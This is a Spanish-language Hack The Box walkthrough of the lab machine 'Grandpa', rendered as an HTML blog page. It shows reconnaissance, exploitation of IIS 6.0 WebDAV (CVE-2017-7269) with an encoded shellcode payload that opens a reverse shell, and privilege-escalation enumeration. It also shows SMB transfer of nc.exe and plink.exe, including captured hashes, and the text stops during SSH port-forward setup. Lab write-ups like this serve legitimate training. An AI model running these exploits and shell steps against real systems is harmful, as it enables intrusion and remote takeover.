@@ -1,0 +1,882 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Grandpa - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Grandpa en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Grandpa">
+<meta property="og:url" content="http://localhost:4000/htb-grandpa/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Grandpa en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-grandpa/grandpa.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-20T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-grandpa/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Grandpa</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Grandpa">
+    <meta itemprop="description" content="Resolución de la máquina Grandpa en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 20, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Grandpa
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-20T00:00:00-05:00">September 20, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-grandpa/banner-grandpa.jpg" alt="" /></p>
+
+<h2 id="grandpa">Grandpa</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.14.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.14
+PING 10.10.10.14 <span class="o">(</span>10.10.10.14<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.14: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>140 ms
+
+<span class="nt">---</span> 10.10.10.14 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 139.697/139.697/139.697/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.14 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 11:46 CDT
+Initiating SYN Stealth Scan at 11:46
+Scanning 10.10.10.14 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.10.14
+Completed SYN Stealth Scan at 11:47, 26.60s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.14
+Host is up, received user-set <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-09-08 11:46:35 CDT <span class="k">for </span>26s
+Not shown: 65534 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.93 seconds
+           Raw packets sent: 131087 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 19 <span class="o">(</span>836B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.14
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span> 10.10.10.14 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 11:49 CDT
+Nmap scan report <span class="k">for </span>10.10.10.14
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Server Date: Wed, 08 Sep 2021 16:53:58 GMT
+|   WebDAV <span class="nb">type</span>: Unknown
+|   Server Type: Microsoft-IIS/6.0
+|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.54 seconds
+</code></pre></div></div>
+
+<p>Obsevamos el puerto 80/TCP abierto y se encuentra corriendo la tecnología <em>Microsoft IIS httpd 6.0</em> la cual es vulnerable a buffer overflow en la función <em>ScStoragePathFromUrl</em> en el servicio <em>WebDAV</em> asociado al CVE CVE-2017-7269. Ahora procedemos a descargar el <a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell">exploit</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
+hell - Parrot Terminal--2021-09-10 01:15:57--  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.110.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 12313 <span class="o">(</span>12K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «iis6 reverse shell»
+
+iis6 reverse shell               100%[<span class="o">=========================================================&gt;]</span>  12.02K  <span class="nt">--</span>.-KB/s    en 0.003s  
+
+2021-09-10 01:15:57 <span class="o">(</span>4.45 MB/s<span class="o">)</span> - «iis6 reverse shell» guardado <span class="o">[</span>12313/12313]
+
+❯ <span class="nb">mv </span>iis6<span class="se">\ </span>reverse<span class="se">\ </span>shell exploit_iis6.py
+</code></pre></div></div>
+
+<p>Lo ejecutamos y observamos que necesitamos introducir parámetros, por lo que nos ponemos en escucha a través del puerto 443 y procedemos a ejecutar el exploit (se le cambio el nombre a <em>exploit_iis6.py</em>):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 exploit_iis6.py 10.10.10.14 80 10.10.14.13 443
+PROPFIND / HTTP/1.1
+Host: localhost
+Content-Length: 1744
+If: &lt;http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪
+㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒
+䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬&gt; <span class="o">(</span>Not &lt;locktoken:write1&gt;<span class="o">)</span> &lt;http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓
+兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹
+䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀
+㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A&gt;
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.14] 1030
+Microsoft Windows <span class="o">[</span>Version 5.2.3790]
+<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2003 Microsoft Corp.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\n</span>etwork service
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div>
+
+<p>Nos encontramos en la máquina víctima como el usuario <em>network service</em>, ahora procedemos a enumerar un poco el sistema para determinar una forma de escalar privilegios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div>
+
+<p>Observamos que tenemos el privilegio <em>SeImpersonatePrivilege</em>, por lo que ya debemos estar pensando en <strong>Juicy Potato</strong>. Checamos la arquitectura de la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo
+
+Host Name:                 GRANPA
+OS Name:                   Microsoft<span class="o">(</span>R<span class="o">)</span> Windows<span class="o">(</span>R<span class="o">)</span> Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            0 Days, 0 Hours, 3 Minutes, 14 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:<span class="se">\W</span>INDOWS
+System Directory:          C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32
+Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
+System Locale:             en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Time Zone:                 <span class="o">(</span>GMT+02:00<span class="o">)</span> Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 794 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,330 MB
+Page File: In Use:         140 MB
+Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix<span class="o">(</span>s<span class="o">)</span>:                 1 Hotfix<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: Q147222
+Network Card<span class="o">(</span>s<span class="o">)</span>:           N/A
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div>
+
+<p>Aqui observamos otra manera potencial de escalar privilegios debido a la versión del sistema operativo que está corriendo la máquina; sin embargo, vamos a hacerlo de otra forma. Listamos los puertos que se encuentran abiertos en la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-nat</span>
+netstat <span class="nt">-nat</span>
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           Offload State
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       InHost      
+  TCP    0.0.0.0:5859           0.0.0.0:0              LISTENING       InHost      
+  TCP    10.10.10.14:80         10.10.14.16:51528      CLOSE_WAIT      InHost      
+  TCP    10.10.10.14:80         10.10.14.16:51586      ESTABLISHED     InHost      
+  TCP    10.10.10.14:139        0.0.0.0:0              LISTENING       InHost      
+  TCP    10.10.10.14:1030       10.10.14.16:443        CLOSE_WAIT      InHost      
+  TCP    10.10.10.14:1033       10.10.14.16:443        ESTABLISHED     InHost      
+  TCP    10.10.10.14:1037       10.10.14.16:445        SYN_SENT        InHost      
+  TCP    10.10.10.14:1038       10.10.14.16:139        SYN_SENT        InHost      
+  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING       InHost      
+  UDP    0.0.0.0:445            <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    0.0.0.0:500            <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    0.0.0.0:1026           <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    0.0.0.0:4500           <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    10.10.10.14:123        <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    10.10.10.14:137        <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    10.10.10.14:138        <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    127.0.0.1:123          <span class="k">*</span>:<span class="k">*</span>                    
+  UDP    127.0.0.1:1029         <span class="k">*</span>:<span class="k">*</span>                    
+
+C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Vemos que tiene el puerto 445 abierto de manera interna, así que vamos a aplicar un <em>Remote Port Forwarding</em> con la herramienta <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">plink.exe</a> descargando para la arquitectura x86. Nos compartimos un servidor SMB y transferimos el archivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.14,1041<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>HTB<span class="se">\G</span>RANPA<span class="nv">$,</span>GRANPA<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GRANPA<span class="se">\G</span>RANPA<span class="nv">$ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> GRANPA<span class="nv">$:</span>:HTB:9b79014814b02ec500000000000000000000000000000000:fb3cb214046af8b85e0b4e269e6cf87ff6bbe6dd226641f0:aaaaaaaaaaaaaaaa
+<span class="o">[</span>-] Unknown level <span class="k">for </span>query path info! 0x109
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>10.10.14.16<span class="se">\s</span>mbFolder<span class="se">\p</span>link.exe plink.exe
+copy <span class="se">\\</span>10.10.14.16<span class="se">\s</span>mbFolder<span class="se">\p</span>link.exe plink.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+<span class="nb">dir
+dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\P</span>rivesc
+
+09/21/2021  05:13 AM    &lt;DIR&gt;          <span class="nb">.</span>
+09/21/2021  05:13 AM    &lt;DIR&gt;          ..
+09/21/2021  05:07 AM           646,384 plink.exe
+               1 File<span class="o">(</span>s<span class="o">)</span>        646,384 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   1,317,171,200 bytes free
+
+C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Antes de ejecutar el programa, vamos a transferir el archivo <code class="language-plaintext highlighter-rouge">nc.exe</code> a la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.14,1041<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>HTB<span class="se">\G</span>RANPA<span class="nv">$,</span>GRANPA<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GRANPA<span class="se">\G</span>RANPA<span class="nv">$ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> GRANPA<span class="nv">$:</span>:HTB:9b79014814b02ec500000000000000000000000000000000:fb3cb214046af8b85e0b4e269e6cf87ff6bbe6dd226641f0:aaaaaaaaaaaaaaaa
+<span class="o">[</span>-] Unknown level <span class="k">for </span>query path info! 0x109
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.10.14,1041<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.14,1043<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>HTB<span class="se">\G</span>RANPA<span class="nv">$,</span>GRANPA<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GRANPA<span class="se">\G</span>RANPA<span class="nv">$ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> GRANPA<span class="nv">$:</span>:HTB:76388b43cfb1010a00000000000000000000000000000000:547480074db8df31be922058c85eadcca897e7868d103ba7:aaaaaaaaaaaaaaaa
+<span class="o">[</span>-] Unknown level <span class="k">for </span>query path info! 0x109
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.10.14,1043<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>10.10.14.16<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe nc.exe
+copy <span class="se">\\</span>10.10.14.16<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe nc.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+<span class="nb">dir
+dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\P</span>rivesc
+
+09/21/2021  05:14 AM    &lt;DIR&gt;          <span class="nb">.</span>
+09/21/2021  05:14 AM    &lt;DIR&gt;          ..
+09/21/2021  04:59 AM            28,160 nc.exe
+09/21/2021  05:07 AM           646,384 plink.exe
+               2 File<span class="o">(</span>s<span class="o">)</span>        674,544 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   1,317,138,432 bytes free
+
+C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Debemos tener en cuenta que necesitamos hacer algunos cambios en nuetra máquina de atacante; primero editamos el archivo <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code> modificando los sigueintes parámetros:</p>
+
+<ul>
+  <li>Port 2222</li>
+  <li>PermitRootLogin yes</li>
+</ul>
+
